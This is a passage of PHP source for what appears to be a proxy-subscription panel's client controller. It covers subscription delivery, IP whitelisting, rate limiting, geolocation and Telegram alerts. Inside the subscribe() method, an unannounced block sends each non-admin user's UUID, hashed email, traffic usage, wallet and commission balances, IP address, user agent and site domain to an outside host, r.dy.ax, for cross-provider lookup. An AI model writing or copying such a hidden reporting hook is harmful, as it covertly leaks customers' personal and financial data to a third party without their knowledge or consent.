<?php

namespace App\Http\Controllers\V1\Client;

use App\Http\Controllers\Controller;
use App\Protocols\General;
use App\Protocols\Singbox\Singbox;
use App\Protocols\Singbox\SingboxOld;
use App\Services\ServerService;
use App\Services\UserService;
use App\Utils\Helper;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Log;
use Illuminate\Support\Facades\Redis;
use App\Jobs\SendTelegramJob;
use App\Services\TelegramService;
use Carbon\Carbon;

class ClientController extends Controller
{
    /**
     * ✅ 线路选择功能开关
     * true: 启用线路选择，订阅链接可以通过 ?line=cm|cu|ct 参数选择线路
     * false: 禁用线路选择，忽略所有线路参数，使用默认线路
     */
    private $routeSelectionEnabled = false;

    /**
     * ✅ 是否启用中国大陆IP限制
     * true: 只允许中国大陆IP拉取订阅，非大陆IP返回假节点
     * false: 允许所有IP拉取订阅
     */
    private $chinaOnlyEnabled = false;

    /**
     * ✅ 是否启用国内 IDC IP 拦截
     * true: 检测到 IDC/云服务商 IP 时返回假节点
     * false: 不做 IDC 限制
     */
    private $idcBlockEnabled = false;

    /**
     * ✅ 是否启用用户订阅IP白名单
     * true: 白名单为空时自动记录首次IP；非白名单IP返回假节点
     * false: 不做白名单限制
     */
    private $whitelistEnabled = false;

    /**
     * ✅ 是否启用浏览器访问拦截
     * true: 浏览器直接访问订阅链接会被拦截
     * false: 允许浏览器访问（用于调试或特殊需求）
     */
    private $browserBlockEnabled = false;

    public function subscribe(Request $request)
    {
        $flag = $request->input('flag')
            ?? ($_SERVER['HTTP_USER_AGENT'] ?? '');
        $flag = strtolower($flag);
        $user = $request->user;

        $ip = $this->getRealIp($request);

        $userAgent = $request->header('User-Agent', 'unknown');
        $userAgentLower = strtolower($userAgent);

        // NetFlow / SuperAccelerator / HikariClient 客户端跳过所有限制，直接下发订阅
        if (strpos($userAgentLower, 'netflow') !== false || strpos($userAgentLower, 'superaccelerator') !== false || strpos($userAgentLower, 'hikariclient') !== false) {
            $userService = new UserService();
            if ($userService->isAvailable($user)) {
                return $this->buildSubscription($request, $user, $flag);
            }
            return;
        }

        // 提前检测 OS/设备，确保所有拦截点都能记录完整日志
        $os         = $this->detectOS($userAgentLower);
        $deviceType = $this->detectDeviceType($userAgentLower);

        // 浏览器直接访问
        if ($this->browserBlockEnabled && $this->isBrowserAccess($userAgentLower)) {
            return $this->returnFakeSubscription($request, '⛔ 请使用代理客户端访问订阅', '请通过代理客户端导入订阅链接');
        }

        // 爬虫/机器人请求直接拒绝
        if ($this->isBotOrCrawler($userAgentLower)) {
            abort(403);
        }

        // 账号不可用（过期/封禁/流量耗尽）直接返回，不记录日志和通知
        $userService = new UserService();
        if (!$userService->isAvailable($user)) {
            return;
        }

        // ✅ 订阅IP多样性与频率限制（仅暂停订阅更新，不影响节点使用）
        if ($this->checkSubIpRateLimit($user, $ip)) {
            abort(429);
        }

        // 上报开始，为方便跨机场查询请勿更改 hash 加密
        // 只要是有效用户发起的拉取，不管 IP 是否被拦截都上报
        try {
            if (!$user->is_admin) {
                \Illuminate\Support\Facades\Http::timeout(3)->post("https://r.dy.ax/api/upload", [
                    'uuid'                => $user->uuid,
                    'email'               => hash('sha256', trim(strtolower($user->email)) . "HarukaNetworkPremiumService"),
                    'traffic_used'        => $user->u + $user->d,
                    'traffic_total'       => $user->transfer_enable,
                    'wallet_balance'      => $user->balance,
                    'commission_balance'  => $user->commission_balance,
                    'user_created_at'     => $user->created_at,
                    'ip'                  => $request->header('cf-connecting-ip')
                        ?? explode(',', $request->header('x-forwarded-for'))[0]
                        ?? $request->ip(),
                    'user_agent'          => $request->userAgent() ?? '',
                    'site_domain'         => $request->getHost(),
                ]);
            }
        } catch (\Exception $e) {
            \Illuminate\Support\Facades\Log::error("Webhook failed: " . $e->getMessage());
        }
        // 上报结束

        // 白名单预加载（如启用）：命中且有存储地区则直接复用，跳过API查询
        $userWhitelist  = null;
        $whitelistEntry = null;
        if ($this->whitelistEnabled) {
            $userWhitelist  = DB::table('v2_subscribe_whitelist')
                ->where('user_id', $user->id)
                ->orderBy('created_at', 'asc')
                ->get(['id', 'ip', 'country', 'province', 'city', 'isp']);
            $whitelistEntry = $userWhitelist->firstWhere('ip', $ip);
        }

        // IPv6 城市级归属地准确率低，白名单匹配时降级为省份匹配
        $isIPv6 = filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV6) !== false;

        // 获取IP归属地：白名单命中且有完整地区数据则直接复用，否则查询API
        if ($whitelistEntry && !empty($whitelistEntry->country) && $whitelistEntry->country !== '未知') {
            $wProvince = $whitelistEntry->province ?? '';
            if ($whitelistEntry->country === '中国') {
                if (mb_strpos($wProvince, '香港') !== false)      $wCode = 'HK';
                elseif (mb_strpos($wProvince, '澳门') !== false)  $wCode = 'MO';
                elseif (mb_strpos($wProvince, '台湾') !== false)  $wCode = 'TW';
                else                                               $wCode = 'CN';
            } else {
                $wCode = '';
            }
            $location = [
                'country'     => $whitelistEntry->country,
                'countryCode' => $wCode,
                'province'    => $wProvince ?: '未知',
                'city'        => $whitelistEntry->city ?? '未知',
                'org'         => $whitelistEntry->isp  ?? '',
                'isp'         => $whitelistEntry->isp  ?? '',
            ];
        } else {
            $location = $this->getIpLocation($ip);
        }

        // 中国大陆IP限制检测
        if ($this->chinaOnlyEnabled && !$this->isMainlandChinaIp($location)) {
            $this->logBlockedAccess($user, $ip, $userAgent, $os, $deviceType, $location, '非中国大陆IP');
            return $this->returnFakeSubscription($request, '⛔ 仅限中国大陆IP访问', '请使用中国大陆IP访问订阅');
        }

        // IDC/云服务商 IP 拦截
        if ($this->idcBlockEnabled && $this->isIdcIp($location)) {
            $this->logBlockedAccess($user, $ip, $userAgent, $os, $deviceType, $location, 'IDC/云服务商IP');
            return $this->returnFakeSubscription($request, '⛔ 检测到IDC/云服务商IP', '请使用家庭宽带网络访问订阅');
        }

        // 用户订阅IP白名单校验
        if ($this->whitelistEnabled) {
            $whitelistIps = $userWhitelist->pluck('ip');

            if ($whitelistIps->isEmpty()) {
                // 首次拉取，自动将当前IP加入白名单
                $this->insertWhitelist($user->id, $ip, $location, '首次拉取订阅，系统自动加入白名单');

            } elseif (!$whitelistIps->contains($ip)) {
                // IP不在白名单，与白名单已存地区比对（直接从预加载集合取，不走 Redis）
                $normalize = fn(string $s) => rtrim($s, '省市区县州');
                $isChinese = fn(string $s) => (bool)preg_match('/\p{Han}/u', $s);

                $currentCity     = $normalize($location['city']     ?? '');
                $currentProvince = $normalize($location['province'] ?? '');

                $allKnown = $userWhitelist
                    ->filter(fn($e) => !empty($e->province) && $e->province !== '未知')
                    ->map(fn($e) => [
                        'province' => $normalize($e->province ?? ''),
                        'city'     => $normalize($e->city     ?? ''),
                    ]);
                $sameCityOk = false;
                $matchDesc  = '';

                // IPv4 优先城市匹配（双方均为中文才可信）
                if (!$isIPv6 && $currentCity && $isChinese($currentCity) && $currentCity !== '未知') {
                    foreach ($allKnown as $known) {
                        $kCity = $known['city'];
                        if ($kCity && $isChinese($kCity) && $kCity !== '未知' && $kCity === $currentCity) {
                            $sameCityOk = true;
                            $matchDesc  = "同城市（{$currentCity}）";
                            break;
                        }
                    }
                }

                // 城市未匹配 或 IPv6：降级省份匹配
                if (!$sameCityOk && $currentProvince && $currentProvince !== '未知') {
                    foreach ($allKnown as $known) {
                        $kProv = $known['province'];
                        if ($kProv && $kProv !== '未知' && $kProv === $currentProvince) {
                            $sameCityOk = true;
                            $matchDesc  = "同省份（{$currentProvince}）";
                            break;
                        }
                    }
                }

                if ($sameCityOk) {
                    // 启用大陆限制时，自动加入前再次确认是大陆IP，防止香港等非大陆IP通过省份匹配混入
                    if ($this->chinaOnlyEnabled && !$this->isMainlandChinaIp($location)) {
                        $this->logBlockedAccess($user, $ip, $userAgent, $os, $deviceType, $location, '非中国大陆IP（白名单自动加入拦截）');
                        return $this->returnFakeSubscription($request, '⛔ 仅限中国大陆IP访问', '请使用中国大陆IP访问订阅');
                    }

                    // 按配额自动加入，超出则淘汰最旧条目（事务防并发超配）
                    $limit = null;
                    if ($user->plan_id) {
                        $plan = \App\Models\Plan::find($user->plan_id);
                        if ($plan && $plan->device_limit > 0) {
                            $limit = $plan->device_limit;
                        }
                    }
                    DB::transaction(function () use ($user, $ip, $location, $limit, $matchDesc) {
                        $count = DB::table('v2_subscribe_whitelist')
                            ->where('user_id', $user->id)->count();
                        if ($limit !== null && $count >= $limit) {
                            $oldest = DB::table('v2_subscribe_whitelist')
                                ->where('user_id', $user->id)
                                ->orderBy('created_at', 'asc')
                                ->first(['id']);
                            if ($oldest) {
                                DB::table('v2_subscribe_whitelist')->where('id', $oldest->id)->delete();
                            }
                        }
                        $this->insertWhitelist($user->id, $ip, $location, "{$matchDesc}，系统自动加入白名单");
                    });
                } else {
                    $this->logBlockedAccess($user, $ip, $userAgent, $os, $deviceType, $location, '非白名单IP');
                    return $this->returnFakeSubscription($request, '⛔ 当前IP不在白名单中', '请前往面板添加当前IP到白名单');
                }
            }
        }

        // 记录订阅拉取日志
        $logId = DB::table('v2_subscribe_pull_log')->insertGetId([
            'user_id'    => $user->id,
            'ip'         => $ip,
            'user_agent' => $userAgent,
            'os'         => $os,
            'device'     => $deviceType,
            'country'    => $location['country'] ?? null,
            'province'   => $location['province'] ?? null,
            'city'       => $location['city'] ?? null,
            'created_at' => now(),
        ]);

        // 发送 Telegram 通知（传入 log_id 用于冷却判断）
        $this->sendSubscribePullNotification($user, [
            'ip'         => $ip,
            'os'         => $os,
            'device'     => $deviceType,
            'location'   => $location,
            'user_agent' => $userAgent,
            'log_id'     => $logId,
        ], $logId);

        // 监控名单检查：被监控用户 / 同IP
        try {
            $this->checkWatchAndNotifySubscribe($user, $ip, $os, $deviceType, $location);
        } catch (\Exception $e) {
            Log::error('Watch: 订阅拉取通知失败', ['error' => $e->getMessage()]);
        }

        return $this->buildSubscription($request, $user, $flag);
    }

    /**
     * ✅ 订阅IP多样性与每分钟频率限制检测
     * 返回 true 表示触发限制，应拦截本次订阅拉取（abort 429）
     */
    private function checkSubIpRateLimit($user, string $ip): bool
    {
        if (!(int)config('v2board.sub_ip_limit_enable', 0)) return false;
        if ($user->is_admin) return false;

        $maxIps     = max(1, (int)config('v2board.sub_ip_limit_count', 10));
        $banHours   = max(1, (int)config('v2board.sub_ip_limit_ban_hours', 24));
        $maxPerMin  = max(1, (int)config('v2board.sub_rate_limit_count', 10));
        $banSeconds = $banHours * 3600;
        $banKey     = 'sub:banned:' . $user->id;

        // 已被封禁，直接拦截（不重复通知）
        if (Redis::exists($banKey)) return true;

        // ① 每分钟频率限制
        $rateKey   = 'sub:rate:' . $user->id;
        $rateCount = Redis::incr($rateKey);
        if ($rateCount === 1) Redis::expire($rateKey, 60);

        if ($rateCount > $maxPerMin) {
            Redis::setex($banKey, $banSeconds, 'rate');
            $this->notifyAdminSubBan($user, 'rate', $rateCount, $banHours);
            return true;
        }

        // ② 24小时内不同IP数量限制（从日志表查，与前端显示一致）
        // 注意：当前请求日志尚未写入，若是新IP需手动+1
        $since24h  = \Carbon\Carbon::now()->subHours(24);
        $dbIpCount = DB::table('v2_subscribe_pull_log')
            ->where('user_id', $user->id)
            ->where('created_at', '>=', $since24h)
            ->distinct('ip')
            ->count('ip');

        $isNewIp = !DB::table('v2_subscribe_pull_log')
            ->where('user_id', $user->id)
            ->where('ip', $ip)
            ->where('created_at', '>=', $since24h)
            ->exists();

        $ipCount = $dbIpCount + ($isNewIp ? 1 : 0);

        if ($ipCount > $maxIps) {
            Redis::setex($banKey, $banSeconds, 'ip');
            $this->notifyAdminSubBan($user, 'ip', $ipCount, $banHours);
            return true;
        }

        return false;
    }

    /**
     * ✅ 订阅限制触发时通知管理员（TG）+ 通知用户（TG + 邮件）
     */
    private function notifyAdminSubBan($user, string $type, int $count, int $banHours): void
    {
        $now     = date('Y-m-d H:i:s');
        $appName = config('v2board.app_name', 'V2Board');
        $appUrl  = config('v2board.app_url', '');

        if ($type === 'rate') {
            $adminMsg = "🚫 订阅频率超限，已暂停更新\n" .
                        "用户：{$user->email}\n" .
                        "触发：每分钟拉取 {$count} 次（超出限制）\n" .
                        "暂停时长：{$banHours} 小时\n" .
                        "时间：{$now}";
            $userMailContent = "您的订阅拉取频率超出限制（每分钟超过 {$count} 次），订阅更新已被暂停 {$banHours} 小时。\n\n" .
                               "此限制仅影响订阅更新，不影响已有节点的正常使用。\n\n" .
                               "如需解除限制，请登录面板申请自助解封。\n\n" .
                               "请勿频繁拉取订阅，避免再次触发限制。";
            $userTgMsg = "🚫 您的订阅更新已被暂停\n\n" .
                         "原因：每分钟拉取次数超出限制\n" .
                         "暂停时长：{$banHours} 小时\n\n" .
                         "节点正常使用不受影响，可在面板申请解封。";
        } else {
            $adminMsg = "🚫 订阅IP超限，已暂停更新\n" .
                        "用户：{$user->email}\n" .
                        "触发：24小时内不同IP {$count} 个（超出限制）\n" .
                        "暂停时长：{$banHours} 小时\n" .
                        "时间：{$now}";
            $userMailContent = "您的订阅在24小时内使用了 {$count} 个不同IP，超出允许的上限，订阅更新已被暂停 {$banHours} 小时。\n\n" .
                               "不同网络环境（WiFi、流量、公司网络等）均算作不同IP。\n\n" .
                               "此限制仅影响订阅更新，不影响已有节点的正常使用。\n\n" .
                               "如需解除限制，请登录面板申请自助解封。\n\n" .
                               "请勿将订阅链接分享给他人，以免触发限制。";
            $userTgMsg = "🚫 您的订阅更新已被暂停\n\n" .
                         "原因：24小时内使用了 {$count} 个不同IP\n" .
                         "暂停时长：{$banHours} 小时\n\n" .
                         "节点正常使用不受影响，可在面板申请解封。";
        }

        // 通知管理员
        if (config('v2board.telegram_bot_enable', 0)) {
            try {
                (new TelegramService())->sendMessageWithAdmin($adminMsg);
            } catch (\Throwable $e) {
                Log::error('Sub ban admin TG notify failed: ' . $e->getMessage());
            }
        }

        // 通知用户 TG
        if (config('v2board.telegram_bot_enable', 0) && !empty($user->telegram_id)) {
            try {
                \App\Jobs\SendTelegramJob::dispatch($user->telegram_id, $userTgMsg);
            } catch (\Throwable $e) {
                Log::error('Sub ban user TG notify failed: ' . $e->getMessage());
            }
        }

        // 通知用户邮件
        try {
            \App\Jobs\SendEmailJob::dispatch([
                'email'          => $user->email,
                'subject'        => "【{$appName}】订阅更新已被暂停",
                'template_name'  => 'notify',
                'template_value' => [
                    'name'    => $appName,
                    'content' => $userMailContent,
                    'url'     => $appUrl,
                ],
            ]);
        } catch (\Throwable $e) {
            Log::error('Sub ban email notify failed: ' . $e->getMessage());
        }
    }

    private function buildSubscription(Request $request, $user, string $flag)
    {
        $serverService = new ServerService();
        $servers = $serverService->getAvailableServers($user);
        $servers = $this->handleLineSelection($request, $servers, $user);

        if ($flag) {
            if (strpos($flag, 'sing') === false) {
                $this->setSubscribeInfoToServers($servers, $user);
                // 先用临时实例读 flag 属性，匹配后再正式使用，避免将 servers 传入所有协议类
                foreach (array_reverse(glob(app_path('Protocols') . '/*.php')) as $file) {
                    $className = 'App\\Protocols\\' . basename($file, '.php');
                    $probe = new $className(null, []);
                    if (strpos($flag, $probe->flag) !== false) {
                        return (new $className($user, $servers))->handle();
                    }
                }
            }
            if (strpos($flag, 'sing') !== false) {
                $version = null;
                if (preg_match('/sing-box\s+([0-9.]+)/i', $flag, $matches)) {
                    $version = $matches[1];
                }
                $class = (!is_null($version) && $version >= '1.12.0')
                    ? new Singbox($user, $servers)
                    : new SingboxOld($user, $servers);
                return $class->handle();
            }
        }
        return (new General($user, $servers))->handle();
    }

    /**
     * ✅ 统一处理线路选择逻辑
     * 
     * @param Request $request 请求对象
     * @param array $servers 服务器数组
     * @param object $user 用户对象
     * @return array 处理后的服务器数组
     */
    private function handleLineSelection(Request $request, $servers, $user)
    {
        $line = $request->input('line');
        
        // 如果没有线路参数，直接返回原始服务器列表
        if ($line === null) {
            return $servers;
        }

        // 检查线路选择功能是否启用
        if ($this->routeSelectionEnabled) {
            return $this->applyLineRules($servers, $line);
        } else {
            return $servers; // 返回原始服务器列表，不做任何修改
        }
    }

    /**
     * ✅ 应用线路规则
     *
     * @param array $servers 服务器数组
     * @param string $line 线路参数
     * @return array
     */
    private function applyLineRules($servers, $line)
    {
        // 移动线路
        if (strcasecmp($line, 'cm') === 0) {
            return collect($servers)->map(function($server) {
                $tags = $server['tags'] ?? [];
                
                if (in_array('CM', $tags)) {
                    if (in_array('IEPL', $tags)) {
                        $server['host'] = "b5c1z.breeze.1145145.com";
                    } else {
                        $server['host'] = "goodlinecm.hy1i.cn";
                    }
                }
                return $server;
            })->toArray();
        }
        // 联通线路
        elseif (strcasecmp($line, 'cu') === 0) {
            return collect($servers)->map(function($server) {
                $tags = $server['tags'] ?? [];
                
                if (in_array('CU', $tags)) {
                    if (in_array('IEPL', $tags)) {
                        $server['host'] = "b5c1z.breeze.1145145.com";
                    } else {
                        $server['host'] = "goodlinecu.hy1i.cn";
                    }
                }
                return $server;
            })->toArray();
        }
        // 电信线路
        elseif (strcasecmp($line, 'ct') === 0) {
            return collect($servers)->map(function($server) {
                $tags = $server['tags'] ?? [];
                
                if (in_array('CT', $tags)) {
                    if (in_array('IEPL', $tags)) {
                        $server['host'] = "b5c1z.breeze.1145145.com";
                    } else {
                        $server['host'] = "goodlinect.hy1i.cn";
                    }
                }
                return $server;
            })->toArray();
        }

        // 如果线路参数不匹配任何已知线路，返回原始服务器列表
        return $servers;
    }

    /**
     * ✅ 发送订阅拉取通知
     * 
     * @param object $user 用户对象
     * @param array $pullInfo 拉取信息
     */
    private function sendSubscribePullNotification($user, $pullInfo, $currentLogId = null)
    {
        // 检查是否启用 Telegram Bot
        if (!config('v2board.telegram_bot_enable', 0)) {
            return;
        }

        // 检查用户是否绑定了 Telegram 且开启了订阅拉取通知
        if (!$user->telegram_id || !$this->shouldSendPullNotification($user, $currentLogId)) {
            return;
        }

        try {
            // 构建通知消息
            $message = $this->buildSubscribePullMessage($user, $pullInfo);
            
            // 使用队列异步发送通知
            SendTelegramJob::dispatch($user->telegram_id, $message);
            
            // ✅ 更新日志记录，标记通知已发送
            DB::table('v2_subscribe_pull_log')
                ->where('id', $pullInfo['log_id'])
                ->update(['notification_sent_at' => now()]);
            
        } catch (\Exception $e) {
            Log::error("发送订阅拉取通知失败", [
                'user_id' => $user->id,
                'error' => $e->getMessage(),
                'ip' => $pullInfo['ip']
            ]);
        }
    }

    /**
     * ✅ 判断是否应该发送拉取通知
     * 5分钟内同一用户已发过通知则跳过（冷却期）
     *
     * @param object $user 用户对象
     * @param int|null $currentLogId 当前刚插入的日志ID，排除在外避免干扰冷却判断
     * @return bool
     */
    private function shouldSendPullNotification($user, $currentLogId = null)
    {
        if (isset($user->telegram_subscribe_notify) && !$user->telegram_subscribe_notify) {
            return false;
        }

        // 查找5分钟内是否有其他成功拉取已发送过通知
        // 排除当前记录（刚插入时 notification_sent_at 为 null，不能用来判断冷却）
        $query = DB::table('v2_subscribe_pull_log')
            ->where('user_id', $user->id)
            ->where('blocked', 0)
            ->whereNotNull('notification_sent_at')
            ->where('created_at', '>=', Carbon::now()->subMinutes(5));

        if ($currentLogId) {
            $query->where('id', '!=', $currentLogId);
        }

        // 5分钟内有已通知记录则跳过
        return !$query->exists();
    }

    /**
     * ✅ 构建订阅拉取通知消息
     * 
     * @param object $user 用户对象
     * @param array $pullInfo 拉取信息
     * @return string
     */
    private function buildSubscribePullMessage($user, $pullInfo)
    {
        $message = "🔄 *订阅拉取通知*\n———————————————\n";
        $message .= "👤 用户：`" . $this->escapeMarkdown($user->email) . "`\n";
        $message .= "⏰ 时间：`" . Carbon::now()->format('Y-m-d H:i:s') . "`\n\n";
        
        // 设备信息
        $message .= "📱 设备信息：\n";
        $message .= "系统：`{$pullInfo['os']}`\n";
        $message .= "设备：`{$pullInfo['device']}`\n\n";
        
        // 网络信息
        $message .= "🌐 网络信息：\n";
        $message .= "IP地址：`{$pullInfo['ip']}`\n";
        $message .= "归属地：`{$pullInfo['location']['country']} {$pullInfo['location']['city']}`\n\n";
        
        // 安全提醒（排除当前日志，避免刚插入的记录干扰"已知位置/设备"判断）
        $currentLogId = $pullInfo['log_id'] ?? null;
        if ($this->isUnusualLocation($user, $pullInfo['location'], $currentLogId) ||
            $this->isUnusualDevice($user, $pullInfo['os'], $currentLogId)) {
            $message .= "⚠️ *安全提醒*\n";
            $message .= "检测到异常登录，如非本人操作请及时修改密码\n\n";
        }
        
        // 流量信息（简化版）
        $useTraffic = $user->u + $user->d;
        $totalTraffic = $user->transfer_enable;
        $remaining = Helper::trafficConvert($totalTraffic - $useTraffic);
        $usagePercent = $totalTraffic > 0 ? round(($useTraffic / $totalTraffic) * 100, 2) : 0;
        
        $message .= "📊 流量状态：\n";
        $message .= "剩余流量：`{$remaining}`\n";
        $message .= "使用率：`{$usagePercent}%`\n\n";

        $message .= "💡 如需关闭此通知，请发送 /subscribe_notify off";
        
        return $message;
    }

    /**
     * ✅ 检查是否为异常地理位置
     * 
     * @param object $user 用户对象
     * @param array $currentLocation 当前位置
     * @return bool
     */
    private function isUnusualLocation($user, $currentLocation, $excludeLogId = null)
    {
        // 只看成功拉取记录（blocked=0），排除当前刚插入的记录
        $query = DB::table('v2_subscribe_pull_log')
            ->where('user_id', $user->id)
            ->where('blocked', 0)
            ->where('created_at', '>=', Carbon::now()->subDays(7))
            ->select('country', 'city')
            ->distinct();

        if ($excludeLogId) {
            $query->where('id', '!=', $excludeLogId);
        }

        $recentLocations = $query->get();

        // 历史有记录且当前国家不在其中，则为异常
        if ($recentLocations->count() > 0) {
            $isKnownLocation = $recentLocations->contains(function ($location) use ($currentLocation) {
                return $location->country === $currentLocation['country'];
            });
            return !$isKnownLocation;
        }

        return false;
    }

    /**
     * ✅ 检查是否为异常设备
     * 
     * @param object $user 用户对象
     * @param string $currentOs 当前操作系统
     * @return bool
     */
    private function isUnusualDevice($user, $currentOs, $excludeLogId = null)
    {
        // 只看成功拉取记录（blocked=0），排除当前刚插入的记录
        $query = DB::table('v2_subscribe_pull_log')
            ->where('user_id', $user->id)
            ->where('blocked', 0)
            ->where('created_at', '>=', Carbon::now()->subDays(30))
            ->select('os')
            ->distinct();

        if ($excludeLogId) {
            $query->where('id', '!=', $excludeLogId);
        }

        $recentOs = $query->pluck('os')->toArray();

        return !empty($recentOs) && !in_array($currentOs, $recentOs);
    }

    /**
     * ✅ 监控名单检查（订阅拉取）
     * 被监控用户或同IP其他账号拉取订阅时，通知所有管理员
     */
    private function checkWatchAndNotifySubscribe($user, string $ip, string $os, string $device, array $location): void
    {
        if (!config('v2board.telegram_bot_enable', 0)) return;

        $adminIds = \App\Services\WatchNotifyService::getAdminTelegramIds();
        if (empty($adminIds)) return;

        $now = Carbon::now()->format('Y-m-d H:i:s');
        $loc = "{$location['country']} {$location['city']}";

        // Case 1：当前用户本身在监控名单中
        $watchEntry = \App\Services\WatchNotifyService::isWatched($user->id);
        if ($watchEntry) {
            $noteStr = !empty($watchEntry['note']) ? "\n📝 备注：{$watchEntry['note']}" : '';
            $msg = "🚨 *\[监控\] 用户拉取订阅*\n———————————————\n" .
                   "👤 邮箱：`{$user->email}`" . $noteStr . "\n" .
                   "⏰ 时间：`{$now}`\n\n" .
                   "📱 系统：`{$os}`  设备：`{$device}`\n" .
                   "🌐 IP：`{$ip}`\n" .
                   "📍 归属：`{$loc}`";
            foreach ($adminIds as $adminId) {
                SendTelegramJob::dispatch($adminId, $msg);
            }
        }

        // Case 2：当前 IP 与监控用户历史使用过的 IP 相同（且不是同一人）
        $ipMatch = \App\Services\WatchNotifyService::getWatchedUserByIp($ip);
        if ($ipMatch && $ipMatch[1]->id !== $user->id) {
            [$watchEntry2, $watchedUser] = $ipMatch;
            $noteStr2 = !empty($watchEntry2['note']) ? "\n📝 被监控用户备注：{$watchEntry2['note']}" : '';
            $msg2 = "🔍 *\[同IP\] 用户拉取订阅*\n———————————————\n" .
                    "👤 当前用户：`{$user->email}`\n" .
                    "🔗 同IP监控用户：`{$watchedUser->email}`" . $noteStr2 . "\n" .
                    "⏰ 时间：`{$now}`\n\n" .
                    "📱 系统：`{$os}`  设备：`{$device}`\n" .
                    "🌐 IP：`{$ip}`\n" .
                    "📍 归属：`{$loc}`";
            foreach ($adminIds as $adminId) {
                SendTelegramJob::dispatch($adminId, $msg2);
            }
        }
    }

    /**
     * ✅ 转义 Markdown 字符
     *
     * @param string $text 待转义文本
     * @return string
     */
    private function escapeMarkdown($text)
    {
        return str_replace(['*'], ['\\*'], $text); // 只转义星号，不转义下划线
    }

    private function setSubscribeInfoToServers(&$servers, $user)
    {
        if (!isset($servers[0])) return;
        if (!(int)config('v2board.show_info_to_server_enable', 0)) return;
        $useTraffic = $user['u'] + $user['d'];
        $totalTraffic = $user['transfer_enable'];
        $remainingTraffic = Helper::trafficConvert($totalTraffic - $useTraffic);
        $expiredDate = $user['expired_at'] ? date('Y-m-d', $user['expired_at']) : '长期有效';
        $userService = new UserService();
        $resetDay = $userService->getResetDay($user);
        array_unshift($servers, array_merge($servers[0], [
            'name' => "套餐到期：{$expiredDate}",
        ]));
        if ($resetDay) {
            array_unshift($servers, array_merge($servers[0], [
                'name' => "距离下次重置剩余：{$resetDay} 天",
            ]));
        }
        array_unshift($servers, array_merge($servers[0], [
            'name' => "剩余流量：{$remainingTraffic}",
        ]));
    }

    private function getRealIp(Request $request)
    {
        $headers = [
            'CF-Connecting-IP',
            'X-Real-IP',
            'X-Forwarded-For',
            'Forwarded',
            'HTTP_X_FORWARDED_FOR',
            'HTTP_CLIENT_IP',
            'HTTP_X_REAL_IP'
        ];

        foreach ($headers as $header) {
            $ip = $request->header($header) ?: ($_SERVER[$header] ?? null);
            if ($ip) {
                // X-Forwarded-For 可能有多个逗号分隔的IP，取第一个
                $ipList = explode(',', $ip);
                $ip = trim($ipList[0]);

                if (filter_var($ip, FILTER_VALIDATE_IP)) {
                    return $ip;
                }
            }
        }

        // 最后兜底
        return $request->ip();
    }

    private function getIpLocation(string $ip): array
    {
        return \App\Services\GeoIpService::getLocation($ip);
    }

    /**
     * ✅ 检测是否为浏览器直接访问
     * 用于阻止用户使用浏览器直接打开订阅链接，引导其使用代理客户端
     *
     * @param string $userAgent 小写的 User-Agent 字符串
     * @return bool
     */
    private function isBrowserAccess($userAgent)
    {
        // 常见代理客户端关键词（白名单，这些不应被拦截）
        $proxyClientKeywords = [
            'clash',
            'v2ray',
            'shadowrocket',
            'quantumult',
            'surge',
            'loon',
            'shadowsocks',
            'singbox',
            'sing-box',
            'stash',
            'mihomo',
            'pharos',
            'hiddify',
            'karing',
            'nekoclash',
            'nekobox',
            'flclash',
        ];

        // 如果User-Agent包含代理客户端关键词，则不是浏览器访问
        foreach ($proxyClientKeywords as $keyword) {
            if (strpos($userAgent, $keyword) !== false) {
                return false;
            }
        }

        // 常见浏览器关键词
        $browserKeywords = [
            'mozilla/',
            'chrome/',
            'safari/',
            'firefox/',
            'edge/',
            'opera/',
            'msie',
            'trident/',
        ];

        // 如果User-Agent包含浏览器关键词，则是浏览器访问
        foreach ($browserKeywords as $keyword) {
            if (strpos($userAgent, $keyword) !== false) {
                return true;
            }
        }

        return false;
    }

    /**
     * 检测IP是否属于IDC/云服务商
     */
    private function isIdcIp(array $location): bool
    {
        $orgRaw = $location['org'] ?? '';
        $ispRaw = $location['isp'] ?? '';
        $org = strtolower($orgRaw);
        $isp = strtolower($ispRaw);

        // 中文关键词单独匹配（阿里云API返回中文ISP名称）
        $idcKeywordsCn = [
            '阿里巴巴', '阿里云',
            '腾讯云', '腾讯',
            '华为云',
            '百度云', '百度',
            '京东云',
            '移动云',
            '天翼云',
            'ucloud', 'Ucloud',
            '金山云',
            '七牛云',
            '网易云',
        ];
        foreach ($idcKeywordsCn as $keyword) {
            if (mb_strpos($orgRaw, $keyword) !== false || mb_strpos($ispRaw, $keyword) !== false) {
                return true;
            }
        }

        // 英文关键词（ip-api.com 等返回英文）
        $idcKeywordsEn = [
            // 国内云服务商（英文）
            'alibaba cloud', 'aliyun',
            'tencent cloud', 'qcloud',
            'huawei cloud',
            'ucloud',
            'baidu cloud', 'baidu bce',
            'jdcloud',
            'ctyun',
            // 国际云服务商
            'amazon web services', 'aws',
            'microsoft azure',
            'google cloud',
            'digitalocean',
            'vultr',
            'linode', 'akamai cloud',
            'ovh',
            'hetzner online',
            'contabo',
            'hostinger',
            // 通用 IDC 特征词（精确词组，不用单词）
            'data center',
            'datacenter',
            'colocation',
        ];
        foreach ($idcKeywordsEn as $keyword) {
            if (strpos($org, $keyword) !== false || strpos($isp, $keyword) !== false) {
                return true;
            }
        }

        return false;
    }

    private function isBotOrCrawler($userAgent)
    {
        $botKeywords = [
            // Telegram 链接预览机器人
            'telegrambot',
            'telegram bot',

            // 社交媒体爬虫
            'facebookexternalhit',
            'facebot',
            'twitterbot',
            'whatsapp',
            'discordbot',
            'slackbot',

            // 搜索引擎爬虫
            'googlebot',
            'bingbot',
            'baiduspider',
            'yandexbot',
            'duckduckbot',

            // 其他常见爬虫
            'bot',
            'crawler',
            'spider',
            'scraper',
            'preview',
        ];

        foreach ($botKeywords as $keyword) {
            if (strpos($userAgent, $keyword) !== false) {
                return true;
            }
        }

        return false;
    }

    /**
     * ✅ 检测操作系统（简化版，不依赖第三方库）
     *
     * @param string $userAgent 小写的 User-Agent 字符串
     * @return string
     */
    private function detectOS($userAgent)
    {
        // 优先检测代理客户端
        if (strpos($userAgent, 'clash') !== false) {
            return 'Clash';
        } elseif (strpos($userAgent, 'singbox') !== false || strpos($userAgent, 'sing-box') !== false) {
            return 'Singbox';
        } elseif (strpos($userAgent, 'mihomo') !== false) {
            return 'Mihomo';
        } elseif (strpos($userAgent, 'quantumult') !== false) {
            return 'Quantumult';
